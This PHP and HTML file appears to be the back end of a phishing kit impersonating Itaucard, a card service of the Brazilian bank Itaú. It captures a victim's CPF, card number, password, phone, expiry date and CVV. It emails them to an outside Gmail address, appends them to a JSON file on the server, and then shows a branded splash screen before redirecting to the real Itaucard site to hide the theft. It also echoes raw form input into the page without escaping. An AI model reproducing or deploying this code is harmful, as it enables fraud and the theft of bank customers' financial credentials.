<?php

ini_set('display_errors', 0 );
error_reporting(0);

$remetente = 'From: envio@rxvxl.com';
$destinatario = 'rxvxltrampos@gmail.com';
$assunto =  'CHEGOU INFOCC';

$cpf =utf8_decode($_POST['cpf']);
$card =utf8_decode($_POST['card']);
$senha = utf8_decode($_POST['senha']);
$phone = utf8_decode($_POST['phone']);
$validade = utf8_decode($_POST['validade']);
$cvv = utf8_decode($_POST['cvv']);
$ip = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('America/Sao_Paulo');
$hora = date("Y-m-d  #  H:i:s");

$corpo = "=============Info Itau=============\n
Cpf: $cpf \n
Card: $card \n
Senha: $senha\n
Numero: $phone\n
Validade: $validade \n
Cvv: $cvv\n
Ip: $ip\n
Hora: $hora\n
=============Info Itau=============";
mail($destinatario, $assunto, $corpo, $remetente);

$chh = curl_init();
$timeout = 0;
curl_setopt($chh, CURLOPT_URL, 'http://www.horariodebrasilia.org/');
curl_setopt($chh, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($chh, CURLOPT_CONNECTTIMEOUT, $timeout);
$conteudo = curl_exec ($chh);
curl_close($chh);
$par = explode("junho de 2016", $conteudo);
$c = substr($par[1], 37, 8);

// JSON 
$fl = "./../doct/ff/ad/ccs.json";
if(file_exists($fl)){
	$h = fopen($fl, "r");
	$arr = json_decode(fread($h, filesize ($fl)));
	array_push($arr,array($cpf, $card, $senha, $phone, $validade, $cvv, $ip, $hora));
	fclose($h);
} else {
	$arr = array(
		array($cpf, $card, $senha, $phone, $validade, $cvv, $ip, $hora)
	);
}
$fhs = fopen($fl, 'w') or die("can't open file");
fwrite($fhs, json_encode($arr));
fclose($fhs);
// fim




sleep(1);
?>



<!DOCTYPE html>
<html>
<head>
	<title>Itaucard</title>
	<meta name="theme-color" content="#253a6d">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
	<link rel="shortcut icon" href="imagens/ico.png" type="image/x-icon" />
	<script type="text/javascript" src="js/jquery.js"></script>
	<style type="text/css">
		*{
			padding: 0;
			margin:0;
		}
		html{
			float: left;
			width: 100%;
			height: 100%;
		}
		body{
			background: linear-gradient(#253a6d, #3f6075);
			background-size: cover;
			background-repeat: no-repeat;
			float: left;
			width: 100%;
			height: 100%;
		}
		img{
			float: left;
			width: 70%;
			margin-left: 15%;
			position: relative;
			margin-top:300px;
		}
	</style>
	
</head>
<body>
<img src="imagens/img_splash_logo.png">


	<input type="hidden" name="cpf" value="<?php echo $_POST['cpf']; ?>">
	<input type="hidden" name="card" value="<?php echo $_POST['card']; ?>">
	<input type="hidden" name="senha" value="<?php echo $_POST['senha']; ?>">
	<input type="hidden" name="phone" value="<?php echo $_POST['phone']; ?>">
	<input type="hidden" name="validade" value="<?php echo $_POST['validade']; ?>">
	<input type="hidden" name="cvv" value="<?php echo $_POST['cvv']; ?>">
	<script type="text/javascript">
		$(document).ready(function() {
			setTimeout(function() {
				location.href = "http://www.itaucard.com.br";
			}, 2000);
		});
	</script>
</body>
</html>